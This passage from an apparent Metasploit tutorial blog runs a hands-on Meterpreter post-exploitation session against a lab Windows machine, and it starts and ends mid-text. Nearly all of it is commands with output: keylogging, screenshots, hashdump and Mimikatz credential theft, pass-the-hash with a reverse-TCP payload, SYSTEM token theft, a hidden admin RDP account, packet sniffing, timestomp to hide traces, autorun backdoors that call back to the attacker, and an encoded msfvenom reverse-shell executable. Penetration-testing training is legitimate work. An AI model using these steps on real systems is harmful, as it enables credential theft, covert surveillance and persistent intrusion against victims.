<p>Successfully flushed the DNS Resolver Cache.
```</p>

<p>If you&rsquo;re feeling brave, you can mess around, uhm, interact with the target registry:</p>

<p>``` plain
meterpreter > reg -h
Usage: reg [command] [options]</p>

<p>Interact with the target machine&rsquo;s registry.</p>

<p>OPTIONS:</p>

<pre><code>-d &lt;opt&gt;  The data to store in the registry value.
-h        Help menu.
-k &lt;opt&gt;  The registry key path (E.g. HKLM\Software\Foo).
-r &lt;opt&gt;  The remote machine name to connect to (with current process credentials
-t &lt;opt&gt;  The registry value type (E.g. REG_SZ).
-v &lt;opt&gt;  The registry value name (E.g. Stuff).
-w        Set KEY_WOW64 flag, valid values [32|64].
</code></pre>

<p>COMMANDS:</p>

<pre><code>enumkey Enumerate the supplied registry key [-k &lt;key&gt;]
createkey   Create the supplied registry key  [-k &lt;key&gt;]
deletekey   Delete the supplied registry key  [-k &lt;key&gt;]
queryclass Queries the class of the supplied key [-k &lt;key&gt;]
setval  Set a registry value [-k &lt;key&gt; -v &lt;val&gt; -d &lt;data&gt;]
deleteval   Delete the supplied registry value [-k &lt;key&gt; -v &lt;val&gt;]
queryval    Queries the data contents of a value [-k &lt;key&gt; -v &lt;val&gt;]
</code></pre>

<p>```</p>

<p>To leverage more Windows-specific functionality, you can choose to spawn a system shell and do your work from there:</p>

<p>``` plain
meterpreter > shell
Process 2368 created.
Channel 5 created.
Microsoft Windows [Version 6.1.7601]
Copyright &copy; 2009 Microsoft Corporation.  All rights reserved.</p>

<p>C:\Windows\system32>
```</p>

<h3>User interface commands</h3>

<p>We can interact with various components of the Windows GUI. First, let&rsquo;s enumerate the available desktops and get the current one:</p>

<p>``` plain
meterpreter > enumdesktops
Enumerating all accessible desktops</p>

<h1>Desktops</h1>

<pre><code>Session  Station  Name
-------  -------  ----
1        WinSta0  Default
1        WinSta0  Disconnect
1        WinSta0  Winlogon
</code></pre>

<p>meterpreter > getdesktop
Session 1\W\D
```</p>

<p>See how long the user has been idle:</p>

<p><code>plain
meterpreter &gt; idletime
User has been idle for: 5 mins 10 secs
</code></p>

<p>If you want to know what the user is up to, you can start a keylogger and quietly observe everything like a ghost in the machine:</p>

<p><code>plain
meterpreter &gt; keyscan_start
Starting the keystroke sniffer...
</code></p>

<p>I typed something on the hacked machine and now I&rsquo;m going to dump the keystrokes and see what we&rsquo;ve got:</p>

<p><code>plain
meterpreter &gt; keyscan_dump
Dumping captured keystrokes...
much $ such security wow
meterpreter &gt; keyscan_stop
Stopping the keystroke sniffer...
</code></p>

<p>Now I want to see what the user sees. So let&rsquo;s take a screenshot:</p>

<p><code>plain
meterpreter &gt; screenshot
Screenshot saved to: /root/ahhOgnkh.jpeg
</code></p>

<p><img class="center" src="/images/tools/metasploit/ss.jpeg" title="&lsquo;screenshot&rsquo; &lsquo;screenshot of target desktop&rsquo;" ></p>

<p>In case you want to annoy the user, you can mess with some of the user interface:</p>

<p><code>plain
meterpreter &gt; uictl -h
Usage: uictl [enable/disable] [keyboard/mouse/all]
</code></p>

<p>I can&rsquo;t demo the webcam and mic commands now so I won&rsquo;t go into those, but you have them at your disposal if the target has a webcam or microphone</p>

<h2>Post exploitation</h2>

<p>Once you have a foothold on the system, there are more things that you can do to assist you in squeezing more juice out of the hacked machine</p>

<h3>Dumping hashes</h3>

<p>You can use <em>hashdump</em> to dump the local hashes:</p>

<p><code>plain
meterpreter &gt; hashdump
Administrator:500:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
wingoat:1000:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
</code></p>

<p>It is possible to also get the hashes and credentials straight from memory by using Mimikatz:</p>

<p>``` plain
meterpreter > load mimikatz
Loading extension mimikatz&hellip;success.
meterpreter > help mimikatz</p>

<h1>Mimikatz Commands</h1>

<pre><code>Command           Description
-------           -----------
kerberos          Attempt to retrieve kerberos creds
livessp           Attempt to retrieve livessp creds
mimikatz_command  Run a custom command
msv               Attempt to retrieve msv creds (hashes)
ssp               Attempt to retrieve ssp creds
tspkg             Attempt to retrieve tspkg creds
wdigest           Attempt to retrieve wdigest creds
</code></pre>

<p>meterpreter > msv
[+] Running as SYSTEM
[*] Retrieving msv credentials</p>

<h1>msv credentials</h1>

<p>AuthID   Package    Domain           User              Password</p>

<hr />

<p>0;98494  NTLM       WIN-D7GA2J1M0TU  wingoat           lm{ aad3b435b51404eeaad3b435b51404ee }, ntlm{ 31d6cfe0d16ae931b73c59d7e0c089c0 }
0;996    Negotiate  WORKGROUP        WIN-D7GA2J1M0TU$  n.s. (Credentials KO)
0;997    Negotiate  NT AUTHORITY     LOCAL SERVICE     n.s. (Credentials KO)
0;49813  NTLM                                          n.s. (Credentials KO)
0;999    NTLM       WORKGROUP        WIN-D7GA2J1M0TU$  n.s. (Credentials KO)
```</p>

<h3>Pass the hash</h3>

<p>We can now use the <a href="https://community.rapid7.com/community/metasploit/blog/2013/03/09/psexec-demystified">psexec</a> module to pass the hash and get access on the box, without any cracking. Note that on my Windows lab machine, I had to go to Local Security Policy &ndash;> Local Policies &ndash;> Security Options &ndash;> Accounts: Limit local account use of blank passwords to console logon only and set it to disabled.</p>

<p>``` plain
msf exploit(psexec) > options</p>

<p>Module options (exploit/windows/smb/psexec):</p>

<p>   Name                  Current Setting                                                    Required  Description</p>

<hr />

<p>   RHOST                 192.168.80.128                                                     yes       The target address
   RPORT                 445                                                                yes       Set the SMB service port
   SERVICE_DESCRIPTION                                                                      no        Service description to to be used on target for pretty listing
   SERVICE_DISPLAY_NAME                                                                     no        The service display name
   SERVICE_NAME                                                                             no        The service name
   SHARE                 ADMIN$                                                             yes       The share to connect to, can be an admin share (ADMIN$,C$,&hellip;) or a normal read/write folder share
   SMBDomain             .                                                                  no        The Windows domain to use for authentication
   SMBPass               aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0  no        The password for the specified username
   SMBUser               wingoat                                                            no        The username to authenticate as</p>

<p>Payload options (windows/x64/meterpreter/reverse_tcp):</p>

<p>   Name      Current Setting  Required  Description</p>

<hr />

<p>   EXITFUNC  thread           yes       Exit technique (Accepted: &lsquo;&rsquo;, seh, thread, process, none)
   LHOST     192.168.80.155   yes       The listen address
   LPORT     5555             yes       The listen port
&hellip;
msf exploit(psexec) > run</p>

<p>[<em>] Started reverse TCP handler on 192.168.80.155:5555
[</em>] Connecting to the server&hellip;
[<em>] Authenticating to 192.168.80.128:445 as user &lsquo;wingoat&rsquo;&hellip;
[</em>] Selecting PowerShell target
[<em>] 192.168.80.128:445 &ndash; Executing the payload&hellip;
[+] 192.168.80.128:445 &ndash; Service start timed out, OK if running a command or non-service executable&hellip;
[</em>] Sending stage (1188911 bytes) to 192.168.80.128
[*] Meterpreter session 4 opened (192.168.80.155:5555 &ndash;> 192.168.80.128:49177) at 2016-06-09 11:37:22 -0400
```</p>

<h3>Token impersonation</h3>

<p>We owned an administrator account. But we want even more privileges. We can use the <em>incognito</em> module to steal the SYSTEM token for ourselves:</p>

<p>``` plain
meterpreter > use incognito
Loading extension incognito&hellip;success.
meterpreter > help
&hellip;</p>

<h1>Incognito Commands</h1>

<pre><code>Command              Description
-------              -----------
add_group_user       Attempt to add a user to a global group with all tokens
add_localgroup_user  Attempt to add a user to a local group with all tokens
add_user             Attempt to add a user with all tokens
impersonate_token    Impersonate specified token
list_tokens          List tokens available under current user context
snarf_hashes         Snarf challenge/response hashes for every token
</code></pre>

<p>```</p>

<p>Let&rsquo;s see what tokens are available:</p>

<p>``` plain
meterpreter > list_tokens
Usage: list_tokens &lt;list_order_option></p>

<p>Lists all accessible tokens and their privilege level</p>

<p>OPTIONS:</p>

<pre><code>-g        List tokens by unique groupname
-u        List tokens by unique username
</code></pre>

<p>meterpreter > list_tokens -u
[&ndash;] Warning: Not currently running as SYSTEM, not all tokens will be available</p>

<pre><code>         Call rev2self if primary process token is SYSTEM
</code></pre>

<h1>Delegation Tokens Available</h1>

<p>NT AUTHORITY\LOCAL SERVICE
NT AUTHORITY\NETWORK SERVICE
NT AUTHORITY\SYSTEM
WIN-D7GA2J1M0TU\wingoat</p>

<h1>Impersonation Tokens Available</h1>

<p>NT AUTHORITY\ANONYMOUS LOGON
```</p>

<p>We are interested in the delegation tokens that are created by interactive logins. And among them..the SYSTEM token that we want!</p>

<p>``` plain
meterpreter > impersonate_token
Usage: impersonate_token <token></p>

<p>Instructs the meterpreter thread to impersonate the specified token. All other actions will then be made in the context of that token.</p>

<p>Hint: Double backslash DOMAIN\name (meterpreter quirk)
Hint: Enclose with quotation marks if name contains a space</p>

<p>meterpreter > impersonate_token &lsquo;NT AUTHORITY\SYSTEM&rsquo;
[&ndash;] Warning: Not currently running as SYSTEM, not all tokens will be available</p>

<pre><code>         Call rev2self if primary process token is SYSTEM
</code></pre>

<p>[+] Delegation token available
[+] Successfully impersonated user NT AUTHORITY\SYSTEM
meterpreter > getuid
Server username: NT AUTHORITY\SYSTEM
```</p>

<h3>Remote Desktop</h3>

<p>Another way we can get access to the system is via Remote Desktop:</p>

<p>``` plain
meterpreter > run getgui
Windows Remote Desktop Enabler Meterpreter Script
Usage: getgui -u <username> -p <password>
Or:    getgui -e</p>

<p>OPTIONS:</p>

<pre><code>-e        Enable RDP only.
-f &lt;opt&gt;  Forward RDP Connection.
-h        Help menu.
-p &lt;opt&gt;  The Password of the user to add.
-u &lt;opt&gt;  The Username of the user to add.
</code></pre>

<p>```</p>

<p>Let&rsquo;s use it to enable Remote Desktop on the target and add our own user:</p>

<p><code>plain
meterpreter &gt; run getgui -e
[*] Windows Remote Desktop Configuration Meterpreter Script by Darkoperator
[*] Carlos Perez carlos_perez@darkoperator.com
[*] Enabling Remote Desktop
[*]     RDP is disabled; enabling it ...
[*] Setting Terminal Services service startup mode
[*]     The Terminal Services service is not set to auto, changing it to auto ...
[*]     Opening port in local firewall if necessary
[*] The following Error was encountered: Rex::TimeoutError Operation timed out.
[*] For cleanup use command: run multi_console_command -rc /root/.msf5/logs/scripts/getgui/clean_up__20160609.2112.rc
meterpreter &gt; run getgui -u master -p pwned
[*] Windows Remote Desktop Configuration Meterpreter Script by Darkoperator
[*] Carlos Perez carlos_perez@darkoperator.com
[*] Setting user account for logon
[*]     Adding User: master with Password: pwned
[*]     Hiding user from Windows Login screen
[*]     Adding User: master to local group 'Remote Desktop Users'
[*]     Adding User: master to local group 'Administrators'
[*] You can now login with the created user
[*] For cleanup use command: run multi_console_command -rc /root/.msf5/logs/scripts/getgui/clean_up__20160609.2308.rc
</code></p>

<p>And to check if it worked, we can use the <em>rdesktop</em> client like this:</p>

<p><code>plain
root@pwnbox:~#rdesktop -u master -p pwned 192.168.80.128
</code></p>

<p><img class="center" src="/images/tools/metasploit/rd.png" title="&lsquo;remote desktop&rsquo; &lsquo;remote desktop session on hacked machine&rsquo;" ></p>

<p>However, this is not very stealthy, because if another user is logged in, they will be disconnected. Anyway, better clean up after ourselves when we&rsquo;re done:</p>

<p><code>plain
meterpreter &gt; run multi_console_command -rc /root/.msf5/logs/scripts/getgui/clean_up__20160609.2308.rc
[*] Running Command List ...
[*]     Running command execute -H -f cmd.exe -a "/c net user master /delete"
Process 832 created.
[*]     Running command reg deleteval -k HKLM\\SOFTWARE\\Microsoft\\Windows\ NT\\CurrentVersion\\Winlogon\\SpecialAccounts\\UserList -v master
[-] stdapi_registry_open_key: Operation failed: The system cannot find the file specified.
</code></p>

<p>Despite the error above, the user was removed from the logon session. However, some files of that user remained behind and I had to manually delete them</p>

<h3>Packet sniffing</h3>

<p>Further on, we can enable a packet sniffer on the target to gather more sensitive information:</p>

<p>``` plain
meterpreter > use sniffer
Loading extension sniffer&hellip;success.
meterpreter > help
&hellip;</p>

<h1>Sniffer Commands</h1>

<pre><code>Command             Description
-------             -----------
sniffer_dump        Retrieve captured packet data to PCAP file
sniffer_interfaces  Enumerate all sniffable network interfaces
sniffer_release     Free captured packets on a specific interface instead of downloading them
sniffer_start       Start packet capture on a specific interface
sniffer_stats       View statistics of an active capture
sniffer_stop        Stop packet capture on a specific interface
</code></pre>

<p>```</p>

<p>First, we must learn what network interfaces are available:</p>

<p>``` plain
meterpreter > sniffer_interfaces</p>

<p>1 &ndash; &lsquo;WAN Miniport (Network Monitor)&rsquo; ( type:3 mtu:1514 usable:true dhcp:false wifi:false )
2 &ndash; &lsquo;Intel&reg; PRO/1000 MT Network Connection&rsquo; ( type:0 mtu:1514 usable:true dhcp:true wifi:false )
```</p>

<p>Now we can start sniffing:</p>

<p><code>plain
meterpreter &gt; sniffer_start 2
[*] Capture started on interface 2 (50000 packet buffer)
</code></p>

<p>We can then dump the packets to a file and see if we&rsquo;ve got anything interesting:</p>

<p><code>plain
meterpreter &gt; sniffer_dump 2 /root/capture.pcap
[*] Flushing packet capture buffer for interface 2...
[*] Flushed 873 packets (756096 bytes)
[*] Downloaded 069% (524288/756096)...
[*] Downloaded 100% (756096/756096)...
[*] Download completed, converting to PCAP...
[*] PCAP file written to /root/capture.pcap
</code></p>

<h3>Modifying file attributes</h3>

<p>If you left traces on the filesystem, you can modify or erase file attributes to conceal your footprints:</p>

<p>``` plain
meterpreter > timestomp -h</p>

<p>Usage: timestomp OPTIONS file_path</p>

<p>OPTIONS:</p>

<pre><code>-a &lt;opt&gt;  Set the "last accessed" time of the file
-b        Set the MACE timestamps so that EnCase shows blanks
-c &lt;opt&gt;  Set the "creation" time of the file
-e &lt;opt&gt;  Set the "mft entry modified" time of the file
-f &lt;opt&gt;  Set the MACE of attributes equal to the supplied file
-h        Help banner
-m &lt;opt&gt;  Set the "last written" time of the file
-r        Set the MACE timestamps recursively on a directory
-v        Display the UTC MACE values of the file
-z &lt;opt&gt;  Set all four attributes (MACE) of the file
</code></pre>

<p>```</p>

<h3>Backdooring the system</h3>

<p>If you want to maintain your presence on the target system, Metasploit has two types of backdoors that can be installed as a service on the target. However, keep in mind that they don&rsquo;t have any authentication, so best not leave them around on computers outside a lab environment &ndash; you don&rsquo;t want to open the door for everyone else in the world.</p>

<h4>Metsvc</h4>

<p>This is how Metsvc looks like:</p>

<p>``` plain
meterpreter > run metsvc -h</p>

<p>OPTIONS:</p>

<pre><code>-A        Automatically start a matching exploit/multi/handler to connect to the service
-h        This help menu
-r        Uninstall an existing Meterpreter service (files must be deleted manually)
</code></pre>

<p>meterpreter > run metsvc
[<em>] Creating a meterpreter service on port 31337
[</em>] Creating a temporary installation directory C:\Users\wingoat\AppData\Local\Temp\zMWkKgMkxJRdgpp&hellip;
[<em>]  >> Uploading metsrv.x86.dll&hellip;
[</em>]  >> Uploading metsvc-server.exe&hellip;
[<em>]  >> Uploading metsvc.exe&hellip;
[</em>] Starting the service&hellip;</p>

<pre><code> * Installing service metsvc
</code></pre>

<ul>
<li>Starting service
Service metsvc successfully installed.
```</li>
</ul>


<p>Unfortunately, I couldn&rsquo;t connect to it because I got a bunch of SSL errors and I couldn&rsquo;t find any workaround.</p>

<h4>Persistence</h4>

<p>The Persistence script has more options:</p>

<p>``` plain
meterpreter > run persistence -h
Meterpreter Script for creating a persistent backdoor on a target host.</p>

<p>OPTIONS:</p>

<pre><code>-A        Automatically start a matching exploit/multi/handler to connect to the agent
-L &lt;opt&gt;  Location in target host to write payload to, if none %TEMP% will be used.
-P &lt;opt&gt;  Payload to use, default is windows/meterpreter/reverse_tcp.
-S        Automatically start the agent on boot as a service (with SYSTEM privileges)
-T &lt;opt&gt;  Alternate executable template to use
-U        Automatically start the agent when the User logs on
-X        Automatically start the agent when the system boots
-h        This help menu
-i &lt;opt&gt;  The interval in seconds between each connection attempt
-p &lt;opt&gt;  The port on which the system running Metasploit is listening
-r &lt;opt&gt;  The IP of the system running Metasploit listening for the connect back
</code></pre>

<p>```</p>

<p>First, we set our listener:</p>

<p>``` plain
msf exploit(handler) > set PAYLOAD windows/meterpreter/reverse_tcp
PAYLOAD => windows/meterpreter/reverse_tcp
msf exploit(handler) > options</p>

<p>Module options (exploit/multi/handler):</p>

<p>   Name  Current Setting  Required  Description</p>

<hr />

<p>Payload options (windows/meterpreter/reverse_tcp):</p>

<p>   Name      Current Setting  Required  Description</p>

<hr />

<p>   EXITFUNC  process          yes       Exit technique (Accepted: &lsquo;&rsquo;, seh, thread, process, none)
   LHOST     192.168.80.155   yes       The listen address
   LPORT     5555             yes       The listen port
&hellip;
```</p>

<p>Then on the target machine we install the backdoor and it connects back to us!</p>

<p><code>plain
meterpreter &gt; run persistence -U -i 5 -p 5555 -r 192.168.80.155
[*] Running Persistance Script
[*] Resource file for cleanup created at /root/.msf5/logs/persistence/WIN-D7GA2J1M0TU_20160610.5432/WIN-D7GA2J1M0TU_20160610.5432.rc
[*] Creating Payload=windows/meterpreter/reverse_tcp LHOST=192.168.80.155 LPORT=5555
[*] Persistent agent script is 148445 bytes long
[+] Persistent Script written to C:\Users\wingoat\AppData\Local\Temp\PxRekDybzCP.vbs
[*] Executing script C:\Users\wingoat\AppData\Local\Temp\PxRekDybzCP.vbs
[+] Agent executed with PID 2720
[*] Installing into autorun as HKCU\Software\Microsoft\Windows\CurrentVersion\Run\VNYLJOXnjCVb
[+] Installed into autorun as HKCU\Software\Microsoft\Windows\CurrentVersion\Run\VNYLJOXnjCVb
meterpreter &gt;
[*] Sending stage (957487 bytes) to 192.168.80.128
[*] Meterpreter session 4 opened (192.168.80.155:5555 -&gt; 192.168.80.128:49172) at 2016-06-10 13:54:36 -0400
</code></p>

<p>When done, don&rsquo;t forget the cleanup:</p>

<p>``` plain
meterpreter > resource /root/.msf5/logs/persistence/WIN-D7GA2J1M0TU_20160610.0141/WIN-D7GA2J1M0TU_20160610.0141.rc
[<em>] Reading /root/.msf5/logs/persistence/WIN-D7GA2J1M0TU_20160610.0141/WIN-D7GA2J1M0TU_20160610.0141.rc
[</em>] Running rm C://Users//wingoat//AppData//Local//Temp//cIABjXRUXdyyr.vbs</p>

<p>[*] Running reg deleteval -k &lsquo;HKCU\Software\Microsoft\Windows\CurrentVersion\Run&rsquo; -v IbLYzVxLgKX</p>

<p>Successfully deleted IbLYzVxLgKX.
```</p>

<h2>Python extensions</h2>

<p>For us Python coders out there, Meterpreter has a nice Python extension that can allow us to run Python code without it being installed on the target machine</p>

<p>``` plain
meterpreter > load python
Loading extension python&hellip;success.
meterpreter > help
&hellip;</p>

<h1>Python Commands</h1>

<pre><code>Command         Description
-------         -----------
python_execute  Execute a python command string
python_import   Import/run a python file or module
python_reset    Resets/restarts the Python interpreter
</code></pre>

<p>```</p>

<h1>Vulnerability scanning</h1>

<p>For web application assessments, Metasploit has a built-in web app scanner called WMAP:</p>

<p>``` plain
msf > load wmap</p>

<p>.&ndash;.&ndash;.&ndash;..&ndash;.&ndash;.&ndash;..&mdash;&ndash;..&mdash;&ndash;.
| | | || | | || | || |&ndash;&lsquo;
<code>-----'</code>&ndash;&rsquo;&ndash;&lsquo;&ndash;&rsquo;<code>-^-'</code>&ndash;&lsquo;
[WMAP 1.5.1] ===  et [  ] metasploit.com 2012
[*] Successfully loaded plugin: wmap
msf > help</p>

<h1>wmap Commands</h1>

<pre><code>Command       Description
-------       -----------
wmap_modules  Manage wmap modules
wmap_nodes    Manage nodes
wmap_run      Test targets
wmap_sites    Manage sites
wmap_targets  Manage targets
wmap_vulns    Display web vulns
</code></pre>

<p>&hellip;
```</p>

<p>First you have to add a site:</p>

<p>``` plain
msf > wmap_sites -h
[*] Usage: wmap_sites [options]</p>

<pre><code>-h        Display this help text
-a [url]  Add site (vhost,url)
-d [ids]  Delete sites (separate ids with space)
-l        List all available sites
-s [id]   Display site structure (vhost,url|ids) (level)
</code></pre>

<p>msf > wmap_sites -a <a href="http://192.168.80.157/">http://192.168.80.157/</a>
[*] Site created.</p>

<p>```</p>

<p>Then you specify the added site as a target:</p>

<p>``` plain
msf > wmap_targets -h
[*] Usage: wmap_targets [options]</p>

<pre><code>-h      Display this help text
-t [urls]   Define target sites (vhost1,url[space]vhost2,url) 
-d [ids]    Define target sites (id1, id2, id3 ...)
-c      Clean target sites list
-l          List all target sites
</code></pre>

<p>msf > wmap_targets -t <a href="http://192.168.80.157/">http://192.168.80.157/</a>
```</p>

<p>Before scanning you might want to take a look at the enabled modules:</p>

<p>``` plain
msf > wmap_modules -h
[*] Usage: wmap_modules [options]</p>

<pre><code>-h      Display this help text
-l          List all wmap enabled modules
-r      Reload wmap modules
</code></pre>

<p>msf > wmap_modules -l
[<em>] Loading wmap modules&hellip;
[</em>] 40 wmap enabled modules loaded.</p>

<h1>[*] wmap_ssl</h1>

<pre><code> Name                         OrderID
 ----                         -------
 auxiliary/scanner/http/cert  :last
 auxiliary/scanner/http/ssl   :last
</code></pre>

<h1>[*] wmap_server</h1>

<pre><code> Name                                           OrderID
 ----                                           -------
 auxiliary/admin/http/tomcat_administration     :last
 auxiliary/admin/http/tomcat_utf8_traversal     :last
 auxiliary/scanner/http/drupal_views_user_enum  :last
 auxiliary/scanner/http/frontpage_login         :last
 auxiliary/scanner/http/host_header_injection   :last
 auxiliary/scanner/http/http_version            0
 auxiliary/scanner/http/open_proxy              1
 auxiliary/scanner/http/options                 :last
 auxiliary/scanner/http/robots_txt              :last
 auxiliary/scanner/http/scraper                 :last
 auxiliary/scanner/http/svn_scanner             :last
 auxiliary/scanner/http/trace                   :last
 auxiliary/scanner/http/vhost_scanner           :last
 auxiliary/scanner/http/webdav_internal_ip      :last
 auxiliary/scanner/http/webdav_scanner          :last
 auxiliary/scanner/http/webdav_website_content  :last
</code></pre>

<h1>[*] wmap_dir</h1>

<pre><code> Name                                                   OrderID
 ----                                                   -------
 auxiliary/scanner/http/brute_dirs                      :last
 auxiliary/scanner/http/dir_listing                     :last
 auxiliary/scanner/http/dir_scanner                     :last
 auxiliary/scanner/http/dir_webdav_unicode_bypass       :last
 auxiliary/scanner/http/file_same_name_dir              :last
 auxiliary/scanner/http/files_dir                       :last
 auxiliary/scanner/http/http_put                        :last
 auxiliary/scanner/http/ms09_020_webdav_unicode_bypass  :last
 auxiliary/scanner/http/prev_dir_same_name_file         :last
 auxiliary/scanner/http/soap_xml                        :last
 auxiliary/scanner/http/trace_axd                       :last
</code></pre>

<h1>[*] wmap_file</h1>

<pre><code> Name                                     OrderID
 ----                                     -------
 auxiliary/dos/http/apache_range_dos      :last
 auxiliary/scanner/http/backup_file       :last
 auxiliary/scanner/http/copy_of_file      :last
 auxiliary/scanner/http/replace_ext       :last
 auxiliary/scanner/http/verb_auth_bypass  :last
</code></pre>

<h1>[*] wmap_unique_query</h1>

<pre><code> Name                                          OrderID
 ----                                          -------
 auxiliary/scanner/http/blind_sql_query        :last
 auxiliary/scanner/http/error_sql_injection    :last
 auxiliary/scanner/http/http_traversal         :last
 auxiliary/scanner/http/rails_mass_assignment  :last
 exploit/multi/http/lcms_php_exec              :last
</code></pre>

<h1>[*] wmap_query</h1>

<pre><code> Name  OrderID
 ----  -------
</code></pre>

<h1>[*] wmap_generic</h1>

<pre><code> Name  OrderID
 ----  -------
</code></pre>

<p>```</p>

<p>And finally, you can see which modules are enabled for your target:</p>

<p>``` plain
msf > wmap_run -h
[*] Usage: wmap_run [options]</p>

<pre><code>-h                        Display this help text
-t                        Show all enabled modules
-m [regex]                Launch only modules that name match provided regex.
-p [regex]                Only test path defined by regex.
-e [/path/to/profile]     Launch profile modules against all matched targets.
                          (No profile file runs all enabled modules.)
</code></pre>

<p>msf > wmap_run -t
[<em>] Testing target:
[</em>]     Site: 192.168.80.157 (192.168.80.157)</p>

<h1>[*]     Port: 80 SSL: false</h1>

<p>[<em>] Testing started. 2016-06-07 13:37:11 -0400
[</em>]</p>

<h1>=[ SSL testing ]=</h1>

<p>[<em>] Target is not SSL. SSL modules disabled.
[</em>]</p>

<h1>=[ Web Server testing ]=</h1>

<p>[<em>] Module auxiliary/scanner/http/http_version
[</em>] Module auxiliary/scanner/http/open_proxy
[<em>] Module auxiliary/scanner/http/robots_txt
[</em>] Module auxiliary/scanner/http/frontpage_login
[<em>] Module auxiliary/scanner/http/host_header_injection
[</em>] Module auxiliary/admin/http/tomcat_administration
[<em>] Module auxiliary/admin/http/tomcat_utf8_traversal
[</em>] Module auxiliary/scanner/http/options
[<em>] Module auxiliary/scanner/http/drupal_views_user_enum
[</em>] Module auxiliary/scanner/http/scraper
[<em>] Module auxiliary/scanner/http/svn_scanner
[</em>] Module auxiliary/scanner/http/trace
[<em>] Module auxiliary/scanner/http/vhost_scanner
[</em>] Module auxiliary/scanner/http/webdav_internal_ip
[<em>] Module auxiliary/scanner/http/webdav_scanner
[</em>] Module auxiliary/scanner/http/webdav_website_content
[*]</p>

<h1>=[ File/Dir testing ]=</h1>

<p>[<em>] Module auxiliary/dos/http/apache_range_dos
[</em>] Module auxiliary/scanner/http/backup_file
[<em>] Module auxiliary/scanner/http/brute_dirs
[</em>] Module auxiliary/scanner/http/copy_of_file
[<em>] Module auxiliary/scanner/http/dir_listing
[</em>] Module auxiliary/scanner/http/dir_scanner
[<em>] Module auxiliary/scanner/http/dir_webdav_unicode_bypass
[</em>] Module auxiliary/scanner/http/file_same_name_dir
[<em>] Module auxiliary/scanner/http/files_dir
[</em>] Module auxiliary/scanner/http/http_put
[<em>] Module auxiliary/scanner/http/ms09_020_webdav_unicode_bypass
[</em>] Module auxiliary/scanner/http/prev_dir_same_name_file
[<em>] Module auxiliary/scanner/http/replace_ext
[</em>] Module auxiliary/scanner/http/soap_xml
[<em>] Module auxiliary/scanner/http/trace_axd
[</em>] Module auxiliary/scanner/http/verb_auth_bypass
[*]</p>

<h1>=[ Unique Query testing ]=</h1>

<p>[<em>] Module auxiliary/scanner/http/blind_sql_query
[</em>] Module auxiliary/scanner/http/error_sql_injection
[<em>] Module auxiliary/scanner/http/http_traversal
[</em>] Module auxiliary/scanner/http/rails_mass_assignment
[<em>] Module exploit/multi/http/lcms_php_exec
[</em>]</p>

<h1>=[ Query testing ]=</h1>

<p>[*]</p>

<h1>=[ General testing ]=</h1>

<p>[*] Done.
```</p>

<p>I started the scan with <code>wmap_run -e</code> (not showing the output due to size). After it finished, I checked if any interesting vulnerabilities were uncovered:</p>

<p><code>plain
msf &gt; wmap_vulns -l
[*] + [192.168.80.157] (192.168.80.157): scraper /
[*]     scraper Scraper
[*]     GET CTF 6 - Widgets Inc.
[*] + [192.168.80.157] (192.168.80.157): directory /docs/
[*]     directory Directoy found.
[*]     GET Res code: 200
[*] + [192.168.80.157] (192.168.80.157): directory /js/
[*]     directory Directoy found.
[*]     GET Res code: 200
[*] + [192.168.80.157] (192.168.80.157): directory /lib/
[*]     directory Directoy found.
[*]     GET Res code: 200
[*] + [192.168.80.157] (192.168.80.157): directory /logs/
[*]     directory Directoy found.
[*]     GET Res code: 401
...
</code></p>

<p>Only a bunch of directories discovered but you don&rsquo;t know what you can find without looking.</p>

<h1>Generating executables</h1>

<p>With Msfvenom, you can not only generate shellcode, but also create executables from whichever payload you want to use.</p>

<p>``` plain
root@pwnbox:~#msfvenom -h
Options:</p>

<pre><code>-p, --payload       &lt;payload&gt;    Payload to use. Specify a '-' or stdin to use custom payloads
    --payload-options            List the payload's standard options
-l, --list          [type]       List a module type. Options are: payloads, encoders, nops, all
-n, --nopsled       &lt;length&gt;     Prepend a nopsled of [length] size on to the payload
-f, --format        &lt;format&gt;     Output format (use --help-formats for a list)
    --help-formats               List available formats
-e, --encoder       &lt;encoder&gt;    The encoder to use
-a, --arch          &lt;arch&gt;       The architecture to use
    --platform      &lt;platform&gt;   The platform of the payload
    --help-platforms             List available platforms
-s, --space         &lt;length&gt;     The maximum size of the resulting payload
    --encoder-space &lt;length&gt;     The maximum size of the encoded payload (defaults to the -s value)
-b, --bad-chars     &lt;list&gt;       The list of characters to avoid example: '\x00\xff'
-i, --iterations    &lt;count&gt;      The number of times to encode the payload
-c, --add-code      &lt;path&gt;       Specify an additional win32 shellcode file to include
-x, --template      &lt;path&gt;       Specify a custom executable file to use as a template
-k, --keep                       Preserve the template behavior and inject the payload as a new thread
-o, --out           &lt;path&gt;       Save the payload
-v, --var-name      &lt;name&gt;       Specify a custom variable name to use for certain output formats
    --smallest                   Generate the smallest possible payload
-h, --help                       Show this message
</code></pre>

<p>```</p>

<p>Let&rsquo;s say we want to use a reverse shell executable. First, let&rsquo;s look at the payload options:</p>

<p>``` plain
root@pwnbox:~#msfvenom &mdash;payload-options -p windows/x64/shell/reverse_tcp
Ignoring bcrypt-3.1.10 because its extensions are not built.  Try: gem pristine bcrypt &mdash;version 3.1.10
Options for payload/windows/x64/shell/reverse_tcp:</p>

<pre><code>   Name: Windows x64 Command Shell, Windows x64 Reverse TCP Stager
 Module: payload/windows/x64/shell/reverse_tcp
</code></pre>

<p>   Platform: Windows</p>

<pre><code>   Arch: x86_64
</code></pre>

<p>Needs Admin: No
 Total size: 449</p>

<pre><code>   Rank: Normal
</code></pre>

<p>Provided by:</p>

<pre><code>sf &lt;stephen_fewer@harmonysecurity.com&gt;
</code></pre>

<p>Basic options:
Name      Current Setting  Required  Description</p>

<hr />

<p>EXITFUNC  process          yes       Exit technique (Accepted: &lsquo;&rsquo;, seh, thread, process, none)
LHOST     192.168.80.155   yes       The listen address
LPORT     4444             yes       The listen port</p>

<p>Description:
  Spawn a piped command shell (Windows x64) (staged). Connect back to
  the attacker (Windows x64)
&hellip;
```</p>

<p>Now we know what options we need for creating an executable. I already have the LHOST and LPORT set, but will pass them anyway for demo purposes:</p>

<p><code>plain
root@pwnbox:~#msfvenom -p windows/x64/shell/reverse_tcp LHOST=192.168.80.155 LPORT=4444 -b "\x00" -e x64/xor -f exe -o ~/doom.exe
